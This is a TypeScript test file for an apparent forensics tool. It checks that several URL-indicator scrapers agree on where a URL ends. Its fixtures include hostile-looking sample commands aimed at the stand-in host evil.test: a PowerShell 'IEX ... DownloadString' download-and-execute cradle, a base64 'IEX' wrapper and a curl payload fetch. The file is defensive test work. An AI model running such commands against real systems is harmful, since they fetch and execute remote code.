// One URL-bearing string through EVERY free-text URL scraper, asserting they answer identically.
//
// #744 unified two scrapers, #752 unified four — and #756 found a fifth that had been missed and had
// already drifted, cutting a quoted URL's trailing dot and a path's own balanced ")". A sixth, in
// bashHistoryImport, held a byte-for-byte copy of that same private trim. The same C2 URL must
// become the same indicator whether a Velociraptor script block, a Cyber Triage row, a Windows 4104
// record, a decoded PowerShell payload or a shell history line carried it. A per-file test cannot
// see that disagreement; this one can, so it is the test that catches the next drift.
//
// EVERY free-text URL scraper belongs in SCRAPERS below. Adding one without registering it here is
// how all three of those issues happened.
import { describe, it, expect } from "vitest";
import { scrapeText } from "../../src/analysis/veloTextIocs.js";
import { parseCybertriage } from "../../src/analysis/cybertriageImport.js";
import { deobfuscateText } from "../../src/analysis/deobfuscate.js";
import { textIocs, type SiemIoc } from "../../src/analysis/siemImport.js";
import { parseShellHistoryFile } from "../../src/analysis/bashHistoryImport.js";

function fromSink(collect: (sink: Map<string, SiemIoc>) => void): string[] {
  const sink = new Map<string, SiemIoc>();
  collect(sink);
  return [...sink.values()].filter((i) => i.type === "url").map((i) => i.value);
}

// 1. Velociraptor free text (matched command line, script block, YARA hit string).
const velo = (text: string): string[] => fromSink((sink) => scrapeText(text, sink));

// 2. SIEM / EDR free-text message — the fifth scraper #756 was filed about.
const siem = (text: string): string[] => fromSink((sink) => textIocs(text, sink));

// 3. A Cyber Triage row's message field.
function cyberTriage(text: string): string[] {
  const row = {
    ctType: "process",
    datetime: "2026-01-28T01:52:00",
    epoch_timestamp: 1769593920,
    event_timestamp: "2026-01-28T01:52:00",
    hostName: "win11",
    message: text,
    path: "/windows/system32/powershell.exe",
    score: "LikelyNotable_Normal",
    scoreDescription: "Downloaded a payload",
    timestamp_desc: "Process Created",
  };
  return parseCybertriage(JSON.stringify(row))
    .iocs.filter((i) => i.type === "url")
    .map((i) => i.value);
}

// 4. The same text carried inside a base64 payload the deobfuscator decodes.
function deobfuscated(text: string): string[] {
  const b64 = Buffer.from(text, "utf8").toString("base64");
  const r = deobfuscateText(`IEX ([Convert]::FromBase64String('${b64}'))`);
  return (r?.rawIocs ?? []).filter((i) => i.type === "url").map((i) => i.value);
}

// 5. A command line read out of a shell history file.
function shellHistory(text: string): string[] {
  return parseShellHistoryFile(`curl -o /tmp/p ${text}`)
    .iocs.filter((i) => i.type === "url")
    .map((i) => i.value);
}

const SCRAPERS: ReadonlyArray<readonly [string, (text: string) => string[]]> = [
  ["velociraptor", velo],
  ["siem", siem],
  ["cyber triage", cyberTriage],
  ["deobfuscate", deobfuscated],
  ["shell history", shellHistory],
];

function agreeOn(text: string, expected: string[]): void {
  for (const [name, scrape] of SCRAPERS) {
    expect(scrape(text), `${name} disagrees on: ${text}`).toEqual(expected);
  }
}

describe("URL scrapers agree on where a URI ends", () => {
  // #755: the markdown link. Every pattern admits both "]" and "(", so the first URL used to run
  // through the "](" splice, swallow the second, and leave matchAll resuming past both — one
  // unresolvable indicator and one URL that never became an indicator at all.
  it("reads a markdown-style link as TWO clean indicators, not one spliced one", () => {
    agreeOn("see [http://evil.test/a](http://evil.test/b) for details", [
      "http://evil.test/a",
      "http://evil.test/b",
    ]);
  });

  it("reads a markdown link whose label and target are the same URL as one indicator", () => {
    agreeOn("[http://evil.test/a](http://evil.test/a)", ["http://evil.test/a"]);
  });

  // #756 row 1 — the #744 defect verbatim: the closing quote proves the dot is part of the path.
  it("keeps a trailing dot that a closing quote proves is part of the URL", () => {
    agreeOn("IEX (New-Object Net.WebClient).DownloadString('http://evil.test/a.')", ["http://evil.test/a."]);
  });

  // #756 row 2 — the private strip took a paren the pattern itself had admitted, emitting a URI
  // with an unbalanced paren that cannot be resolved.
  it("keeps a balanced paren the URL path opened", () => {
    agreeOn("staged at http://evil.test/a(foo)", ["http://evil.test/a(foo)"]);
  });

  it("drops a paren the sentence opened", () => {
    agreeOn("(grab it from http://evil.test/a)", ["http://evil.test/a"]);
  });

  it("strips sentence punctuation from a bare URL", () => {
    agreeOn("payload came from http://evil.test/a.", ["http://evil.test/a"]);
    agreeOn("payload came from http://evil.test/a,", ["http://evil.test/a"]);
  });

  // The bracket is REQUIRED IPv6 authority syntax — cutting there loses the port and the path.
  it("reads a whole IPv6 URL, bracket, port and path", () => {
    agreeOn("beacon to http://[2001:db8::1]:8080/x", ["http://[2001:db8::1]:8080/x"]);
  });

  // The splice guard and IPv6 authority syntax meet here: the "](" that ends a markdown link is
  // also the boundary between an IPv6 host and a parenthesised aside. Guarding the "]" instead of
  // the "(" cut this to "http://[2001:db8::1" — an address with no closing bracket, which is not a
  // resolvable authority.
  it("keeps the IPv6 bracket when parenthesised prose follows the URL", () => {
    agreeOn("beacon to http://[2001:db8::1](IPv6 endpoint)", ["http://[2001:db8::1]"]);
  });

  it("drops a bracket the writer opened around a URL", () => {
    agreeOn("see [http://evil.test/a] for details", ["http://evil.test/a"]);
  });

  it("keeps a trailing slash, which is a directory prefix and not sentence punctuation", () => {
    agreeOn("uploaded to http://evil.test/loot/.", ["http://evil.test/loot/"]);
  });
});
